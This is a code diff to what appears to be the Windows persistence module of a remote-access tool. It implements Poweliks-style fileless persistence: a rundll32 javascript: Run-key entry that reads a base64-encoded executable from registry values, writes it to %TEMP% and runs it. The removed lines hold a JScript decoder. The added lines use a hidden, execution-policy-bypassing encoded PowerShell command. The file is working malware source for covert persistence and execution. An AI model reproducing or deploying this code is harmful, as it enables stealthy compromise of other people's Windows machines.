@@ -46,7 +46,7 @@ def binary_startup(bin_path):
 
 def javascript_startup(bin_data):
     run = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
-    pupy = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\pupy'
+    pupy = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion'
     marker = 'C:\\WINDOWS\\system32\\rundll32.exe'
     HKEY, HK, runkey = registry_check(run,marker)
 
@@ -56,18 +56,22 @@ def javascript_startup(bin_data):
         n = 16383
         bin_b64_data = [bin_data[i:i+n] for i in range(0, len(bin_data), n)]
 
-        # original poweliks reg script to load encoded js
-        js_main = 'C:\\WINDOWS\\system32\\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\74script language=jscript.encode>"+(new%%20activexobject("wscript.shell")).regread("%s\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")+"\74/script>")' % (HK)
-
-        # goal was to use powershell to inject but the bin maybe too large so someone else will have to figure out, now javascript recreates bin and run from %temp%, see js_decoder.js for cleaner format
-        js_decoder = """var base64={};base64.PADCHAR='=';base64.ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';base64.makeDOMException=function(){var e,tmp;try{return new DOMException(DOMException.INVALID_CHARACTER_ERR)}catch(tmp){var ex=new Error('DOM Exception 5');ex.code=ex.number=5;ex.name=ex.description='INVALID_CHARACTER_ERR';ex.toString=function(){return'Error: '+ex.name+': '+ex.message};return ex}};base64.getbyte64=function(s,i){var idx=base64.ALPHA.indexOf(s.charAt(i));if(idx===-1){throw base64.makeDOMException();}return idx};base64.decode=function(s){s=''+s;var getbyte64=base64.getbyte64;var pads,i,b10;var imax=s.length;if(imax===0){return s}if(imax%%4!==0){throw base64.makeDOMException();}pads=0;if(s.charAt(imax-1)===base64.PADCHAR){pads=1;if(s.charAt(imax-2)===base64.PADCHAR){pads=2}imax-=4}var x=[];for(i=0;i<imax;i+=4){b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6)|getbyte64(s,i+3);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff,b10&0xff))}switch(pads){case 1:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff));break;case 2:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12);x.push(String.fromCharCode(b10>>16));break}return x.join('')};base64.getbyte=function(s,i){var x=s.charCodeAt(i);if(x>255){throw base64.makeDOMException();}return x};function regGetChildValues(strComputer,regRoot,strRegPath){try{var aNames=[];var aTypes=[];var objLocator=new ActiveXObject("WbemScripting.SWbemLocator");var objService=objLocator.ConnectServer(strComputer,"root\\default");var objReg=objService.Get("StdRegProv");var objMethod=objReg.Methods_.Item("EnumValues");var objInParam=objMethod.InParameters.SpawnInstance_();objInParam.hDefKey=regRoot;objInParam.sSubKeyName=strRegPath;var objOutParam=objReg.ExecMethod_(objMethod.Name,objInParam);switch(objOutParam.ReturnValue){case 0:aNames=(objOutParam.sNames!=null)?objOutParam.sNames.toArray():null;aTypes=(objOutParam.Types!=null)?objOutParam.Types.toArray():null;break;case 2:aNames.length=0;break;}}catch(e){ShowMessage('ERROR: '+e.number+' '+e.description,msiMessageTypeInfo);return{Results:0,Names:null,Types:null};}return{Results:aNames.length,Names:aNames,Types:aTypes};}function randstring(min,max){var text="";var char="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";var len=Math.floor(Math.random()*(max-min+1)+min);for(var i=0;i<len;i++){text+=char.charAt(Math.floor(Math.random()*char.length));}return text;}var HKEY_CURRENT_USER=0x80000001;var HKEY_LOCAL_MACHINE=0x80000002;var regkey='SOFTWARE\\Microsoft\\Windows\\CurrentVersion';var machine_name='.';var Values=regGetChildValues(machine_name,%s,regkey);if(Values.Results==0){WScript.Echo('No instances found!');}else{var WshShell=new ActiveXObject("WScript.Shell");var key_value;var key_value_cat;for(i=0;i<Values.Results;i++){if(Values.Types[i]==1){key_value=WshShell.RegRead('%s\\'+regkey+'\\'+Values.Names[i]);key_value_cat+=key_value;}}key_value_cat=key_value_cat.replace('undefined','');key_value_cat=base64.decode(key_value_cat);var temp=WshShell.ExpandEnvironmentStrings("%TEMP%");var min=6;var max=12;var tempfile=temp+'\\'+randstring(min,max)+'.exe';var stream=new ActiveXObject("ADODB.Stream");stream.Type=2;stream.Charset="ISO-8859-1";stream.Open();stream.WriteText(key_value_cat);stream.SaveToFile(tempfile,2);stream.Close();var run=new ActiveXObject('WSCRIPT.Shell').Run(tempfile);}""" % (HKEY,HK)
-
         js_name = ''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
-        decoder_name = ''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
+        script_name = ''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
+
+        # original poweliks reg script
+        js_main = """C:\\WINDOWS\\system32\\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\\74script language=jscript>"+((new%%20ActiveXObject("WScript.Shell")).RegRead("%s\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\%s")+"\\74/script>"))""" % (HK, script_name)
+
+        # b64 decoder entry for encoded binary
+        # originally used for powersploit shellcode injection, file is too large to inject directly, leaving it in part for future use
+        # https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/
+        ps_script = base64.b64encode(("""$shellcode_string='$key="HKCU:\Software\Microsoft\Windows\CurrentVersion";$key_val=(Get-Item -Path $key).Property;foreach($value in $key_val){[string]$b64+=(Get-Item -Path $key).GetValue($value)};$ByteArray=[System.Convert]::FromBase64String($b64);[string]$File=(Join-Path -Path $env:TEMP -ChildPath ([system.guid]::NewGuid().ToString()+".exe"));[System.IO.File]::WriteAllBytes($File, $ByteArray);Start-Process -FilePath $File;';$goat=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($shellcode_string));if($env:PROCESSOR_ARCHITECTURE -eq "AMD64"){$powershellx86=$env:SystemRoot+"syswow64WindowsPowerShellv1.0powershell.exe";$cmd="-noprofile -windowstyle hidden -noninteractive -EncodedCommand";iex "& $powershellx86 $cmd $goat";}else{$cmd="-noprofile -windowstyle hidden -noninteractive -EncodedCommand";iex "& powershell $cmd $goat";}""").encode('utf_16_le'))
+        
+        js_script = """var shell=new ActiveXObject("WScript.Shell");shell.run("powershell -executionpolicy bypass -noexit -encodedCommand %s")""" % (ps_script)
 
         key = OpenKey(HKEY, run, 0, KEY_WRITE)
         SetValueEx(key, js_name, 0, REG_SZ, js_main)
-        SetValueEx(key, decoder_name, 0, REG_SZ, js_decoder)
+        SetValueEx(key, script_name, 0, REG_SZ, js_script)
         CloseKey(key)
 
         randname = []
